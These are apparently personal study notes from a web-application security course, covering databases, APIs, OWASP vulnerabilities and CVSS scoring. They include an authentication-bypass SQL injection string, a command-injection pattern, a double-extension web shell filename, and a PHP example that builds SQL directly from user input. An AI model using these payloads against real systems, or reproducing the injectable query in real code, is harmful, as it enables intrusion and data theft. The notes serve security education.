		* [Relational](https://en.wikipedia.org/wiki/Relational_database) (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.
		* A table can have more than one key, as another column can be used as a key to link with another table. For example, the `id` column can be used as a key to link the `posts` table to another table containing comments, each of which belongs to a certain post, and so on.
		* The relationship between tables within a database is called a **Schema**.
		* Some of the most common relational databases include:
			* [MySQL](https://en.wikipedia.org/wiki/MySQL) - The most commonly used database around the internet. It is an open-source database and can be used completely free of charge
			* [MSSQL](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) - Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers
			* [Oracle](https://en.wikipedia.org/wiki/Oracle_Database) - A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses
			* [PostgreSQL](https://en.wikipedia.org/wiki/PostgreSQL) - Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design
			* Other common SQL databases include: `SQLite`, `MariaDB`, `Amazon Aurora`, and `Azure SQL`.
		* **Non-relational (NoSQL)**
			* A [non-relational database](https://en.wikipedia.org/wiki/NoSQL) does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a `NoSQL` database stores data using various storage models, depending on the type of data stored.
			* Due to the lack of a defined structure for the database, `NoSQL` databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a `NoSQL` database would be the best choice for storing our data.
			* There are 4 common storage models for `NoSQL` databases:
				* Key-Value
				* Document-Based
				* Wide-Column
				* Graph
			* Each of the above models has a different way of storing data. For example, the `Key-Value` model usually stores data in `JSON` or `XML`, and has a key for each pair, storing all of its data as its value:
			* ![[Pasted image 20231220130412.png]]
			* The above example can be represented using `JSON` as follows:
			* ```
			{
			  "100001": {
			    "date": "01-01-2021",
			    "content": "Welcome to this web application."
			  },
			  "100002": {
			    "date": "02-01-2021",
			    "content": "This is the first post on this web app."
			  },
			  "100003": {
			    "date": "02-01-2021",
			    "content": "Reminder: Tomorrow is the ..."
			  }
			}```
			* It looks similar to a dictionary/map/key-value pair in languages like `Python` or `PHP` 'i.e. `{'key':'value'}`', where the `key` is usually a string, the `value` can be a string, dictionary, or any class object.
			* The `Document-Based` model stores data in complex `JSON` objects and each object has certain meta-data while storing the rest of the data similarly to the `Key-Value` model.
			* Some of the most common `NoSQL` databases include:
				* [MongoDB](https://en.wikipedia.org/wiki/MongoDB) - The most common `NoSQL` database. It is free and open-source, uses the `Document-Based` model, and stores data in `JSON` objects
				* [ElasticSearch](https://en.wikipedia.org/wiki/Elasticsearch) - Another free and open-source `NoSQL` database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient
				* [Apache Cassandra](https://en.wikipedia.org/wiki/Apache_Cassandra) - Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values
				* Other common `NoSQL` databases include: `Redis`, `Neo4j`, `CouchDB`, and `Amazon DynamoDB`.
	* **Use in Web Apps**
		* Most modern web development languages and frameworks make it easy to integrate, store, and retrieve data from various database types. But first, the database has to be installed and set up on the back end server, and once it is up and running, the web applications can start utilizing it to store and retrieve data.
		* For example, within a `PHP` web application, once `MySQL` is up and running, we can connect to the database server with:
			* `$conn = new mysqli("localhost", "user", "pass");`
		* Then, we can create a new database with:
			* ```
			$sql = "CREATE DATABASE database1";
			$conn->query($sql)```
		* After that, we can connect to our new database, and start using the `MySQL` database through `MySQL` syntax, right within `PHP`, as follows:
			* ```
			$conn = new mysqli("localhost", "user", "pass", "database1");
			$query = "select * from table_1";
			$result = $conn->query($query);```
		* Web applications usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the database(s).
			* ```
			$searchInput =  $_POST['findUser'];
			$query = "select * from users where name like '%$searchInput%'";
			$result = $conn->query($query);```
		* Finally, the web application sends the result back to the user:
			* ```
			while($row = $result->fetch_assoc() ){
				echo $row["name"]."<br>";
			}```
	* If not securely coded, database code can lead to a variety of issues, like [SQL Injection vulnerabilities](https://owasp.org/www-community/attacks/SQL_Injection).
* ## Development Frameworks & APIs
	* In addition to web servers that can host web applications in various languages, there are many common web development frameworks that help in developing core web application files and functionality. With the increased complexity of web applications, it may be challenging to create a modern and sophisticated web application from scratch. Hence, most of the popular web applications are developed using web frameworks.
	* As most web applications share common functionality -such as user registration-, web development frameworks make it easy to quickly implement this functionality and link them to the front end components, making a fully functional web application. Some of the most common web development frameworks include:
		- [Laravel](https://laravel.com/) (`PHP`): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
		- [Express](https://expressjs.com/) (`Node.JS`): used by `PayPal`, `Yahoo`, `Uber`, `IBM`, and `MySpace`.
		- [Django](https://www.djangoproject.com/) (`Python`): used by `Google`, `YouTube`, `Instagram`, `Mozilla`, and `Pinterest`.
		- [Rails](https://rubyonrails.org/) (`Ruby`): used by `GitHub`, `Hulu`, `Twitch`, `Airbnb`, and even `Twitter` in the past.
	- **APIs**
		- An important aspect of back end web application development is the use of Web [APIs](https://en.wikipedia.org/wiki/API) and HTTP Request parameters to connect the front end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.
		- For the front end component to interact with the back end and ask for certain tasks to be carried out, they utilize APIs to ask the back end component for a specific task with specific input. The back end components process these requests, perform the necessary functions, and return a certain response to the front end components, which finally renderers the end user's output on the client-side.
		- **Query Parameters**
			- The default method of sending specific arguments to a web page is through `GET` and `POST` request parameters. This allows the front end components to specify values for certain parameters used within the page for the back end components to process them and respond accordingly.
			- For example, a `/search.php` page would take an `item` parameter, which may be used to specify the search item. Passing a parameter through a `GET` request is done through the URL '`/search.php?item=apples`', while `POST` parameters are passed through `POST` data at the bottom of the `POST` `HTTP` request:
			- ```
			POST /search.php HTTP/1.1
			...SNIP...
			
			item=apples```
		* **Web APIs**
			* An API ([Application Programming Interface](https://en.wikipedia.org/wiki/API)) is an interface within an application that specifies how the application can interact with other applications. For Web Applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the `HTTP` protocol and are usually handled and translated through web servers.
			* A weather web application, for example, may have a certain API to retrieve the current weather for a certain city. We can request the API URL and pass the city name or city id, and it would return the current weather in a `JSON` object. Another example is Twitter's API, which allows us to retrieve the latest Tweets from a certain account in `XML` or `JSON` formats, and even allows us to send a Tweet 'if authenticated', and so on.
			* To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like `SOAP` or `REST`
	* **SOAP**
		* The `SOAP` ([Simple Objects Access](https://en.wikipedia.org/wiki/SOAP)) standard shares data through `XML`, where the request is made in `XML` through an HTTP request, and the response is also returned in `XML`. Front end components are designed to parse this `XML` output properly. The following is an example `SOAP` message:
			* ```
			<?xml version="1.0"?>
			
			<soap:Envelope
			xmlns:soap="http://www.example.com/soap/soap/"
			soap:encodingStyle="http://www.w3.org/soap/soap-encoding">
			
			<soap:Header>
			</soap:Header>
			
			<soap:Body>
			  <soap:Fault>
			  </soap:Fault>
			</soap:Body>
			
			</soap:Envelope>```
		* `SOAP` is very useful for transferring structured data (i.e., an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly. It is also very useful for sharing _stateful_ objects -i.e., sharing/changing the current state of a web page-, which is becoming more common with modern web applications and mobile applications.
		* However, `SOAP` may be difficult to use for beginners or require long and complicated requests even for smaller queries, like basic `search` or `filter` queries. This is where the `REST` API standard is more useful.
	* **REST**
		* The `REST` ([Representational State Transfer](https://en.wikipedia.org/wiki/Representational_state_transfer)) standard shares data through the URL path 'i.e. `search/users/1`', and usually returns the output in `JSON` format 'i.e. userid `1`'.
		* Unlike Query Parameters, `REST` APIs usually focus on pages that expect one type of input passed directly through the URL path, without specifying its name or type. This is usually useful for queries like `search`, `sort`, or `filter`. This is why `REST` APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions, making the web application more modular and scalable.
		* Responses to `REST` API requests are usually made in `JSON` format, and the front end components are then developed to handle this response and render it properly. Other output formats for `REST` include `XML`, `x-www-form-urlencoded`, or even raw data. As seen previously in the `database` section, the following is an example of a `JSON` response to the `GET /category/posts/` API request:
			* ```
			{
			  "100001": {
			    "date": "01-01-2021",
			    "content": "Welcome to this web application."
			  },
			  "100002": {
			    "date": "02-01-2021",
			    "content": "This is the first post on this web app."
			  },
			  "100003": {
			    "date": "02-01-2021",
			    "content": "Reminder: Tomorrow is the ..."
			  }
			}```
		* `REST` uses various HTTP methods to perform different actions on the web application:
			- `GET` request to retrieve data
			- `POST` request to create data (non-idempotent)
			- `PUT` request to create or replace existing data (idempotent)
			- `DELETE` request to remove data
- ## Common Web Vulnerabilities
	- The below examples are some of the most common vulnerability types for web applications, part of [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilities for web applications.
		- **Broken Authentication/Access Control**
			- `Broken Authentication` refers to vulnerabilities that allow attackers to bypass authentication functions. For example, this may allow an attacker to login without having a valid set of credentials or allow a normal user to become an administrator without having the privileges to do so.
			- `Broken Access Control` refers to vulnerabilities that allow attackers to access pages and features they should not have access to. For example, a normal user gaining access to the admin panel.
			- For example, `College Management System 1.2` has a simple [Auth Bypass](https://www.exploit-db.com/exploits/47388) vulnerability that allows us to login without having an account, by inputting the following for the email field: `' or 0=0 #`, and using any password with it.
		- **Malicious File Upload**
			- Another common way to gain control over web applications is through uploading malicious scripts. If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a `PHP` script), which will allow us to execute commands on the remote server.
			- For example, the WordPress Plugin `Responsive Thumbnail Slider 1.0` can be exploited to upload any arbitrary file, including malicious scripts, by uploading a file with a double extension (i.e. `shell.php.jpg`). There's even a [Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/wp_responsive_thumbnail_slider_upload/) that allows us to exploit this vulnerability easily.
		- **Command Injection**
			- Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called [command injection](https://owasp.org/www-community/attacks/Command_Injection).
			- For example, the WordPress Plugin `Plainview Activity Monitor 20161228` has a [vulnerability](https://www.exploit-db.com/exploits/45274) that allows attackers to inject their command in the `ip` value, by simply adding `| COMMAND...` after the `ip` value.
		- **SQL Injection (SQLi)**
			- Another very common vulnerability in web applications is a `SQL Injection` vulnerability. Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.
			- For example, the same previous `College Management System 1.2` suffers from a SQL injection [vulnerability](https://www.exploit-db.com/exploits/47388), in which we can execute another `SQL` query that always returns `true`, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.
- ## Public Vulnerabilities
	- The most critical back end component vulnerabilities are those that can be attacked externally and can be leveraged to take control over the back end server without needing local access to that server (i.e., external penetration testing). These vulnerabilities are usually caused by coding mistakes made during the development of a web application's back-end components. So, there is a wide variety of vulnerability types in this area, ranging from basic vulnerabilities that can be exploited with relative ease to sophisticated vulnerabilities requiring deep knowledge of the entire web application.
	- **Public CVE**
		- As many organizations deploy web applications that are publicly used, like open-source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. This leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE ([Common Vulnerabilities and Exposures](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)) record and score.
		- Many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited and usually make these exploits available for public use, for testing and educational purposes. This makes searching for public exploits the very first step we must go through for web applications.
			- ==Tip: The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.==
		- Once we identify the web application version, we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). 
		- We would usually be interested in exploits with a CVE score of 8-10 or exploits that lead to `Remote Code Execution`. Other types of public exploits should also be considered if none of the above is available.
	- **Common Vulnerability Scoring System **(CVSS)**
		- The [Common Vulnerability Scoring System (CVSS)](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System) is an open-source industry standard for assessing the severity of security vulnerabilities. This scoring system is often used as a standard measurement for organizations and governments that need to produce accurate and consistent severity scores for their systems' vulnerabilities. This helps with the prioritization of resources and the response to a given threat.
		- CVSS scores are based on a formula that uses several metrics: `Base`, `Temporal`, and `Environmental`. When calculating the severity of a vulnerability using CVSS, the `Base` metrics produce a score ranging from 0 to 10, modified by applying `Temporal` and `Environmental` metrics. The [National Vulnerability Database (NVD)](https://nvd.nist.gov/) provides CVSS scores for almost all known, publicly disclosed vulnerabilities. At this time, the NVD only provides `Base` scores based upon a given vulnerability's inherent characteristics. The current scoring systems in place are CVSS v2 and CVSS v3. There are several differences between the v2 and v3 systems, namely changes to the `Base` and `Environmental` groups to account for additional metrics. More information about the differences between the two scoring systems can be found [here](https://www.balbix.com/insights/cvss-v2-vs-cvss-v3).
		- CVSS scoring ratings differ slightly between V2 and V3 as can be seen in the following tables:
			- ![[Pasted image 20231220134555.png]]
		- The NVD does not factor in `Temporal` and `Environmental` metrics because the former can change over time due to external events. The latter is a customized metric based on the potential impact of the vulnerability on a given organization. The NVD provides a [CVSS v2 calculator](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator) and a [CVSS v3 calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) that organizations can use to factor additional risk from `Temporal` and `Environmental` data unique to them. The calculators are very interactive and can be used to fine-tune the CVSS score to our environment.
		- This handy [guide](https://www.first.org/cvss/user-guide) is extremely useful for understanding V2 and V3 and how to use the calculators to arrive at a given score.
	- **Back-end Server Vulnerabilities**
		- The most critical vulnerabilities for back-end components are found in web servers, as they are publicly accessible over the `TCP` protocol. An example of a well-known web server vulnerability is the `Shell-Shock`, which affected Apache web servers released during and before 2014 and utilized `HTTP` requests to gain remote control over the back-end server.
		- As for vulnerabilities in the back-end server or the database, they are usually utilized after gaining local access to the back-end server or back-end network, which may be gained through `external` vulnerabilities or during internal penetration testing. They are usually used to gain high privileged access on the back-end server or the back-end network or gain control over other servers within the same network.
- ## Next-Steps
	- The `Web Requests` and `JavaScript Deobfuscation` Academy modules will help build on the knowledge presented in this module.
	* The module `Hacking WordPress` and other similar modules related to `OWASP Top 10` (such as `SQL Injection Fundamentals`) are great next steps to get into penetration testing web applications and learn more about web application vulnerabilities and exploitation. Finally, to apply what we learned from these modules, we can jump into attacking some `Easy` boxes on [HackTheBox](https://www.hackthebox.eu/).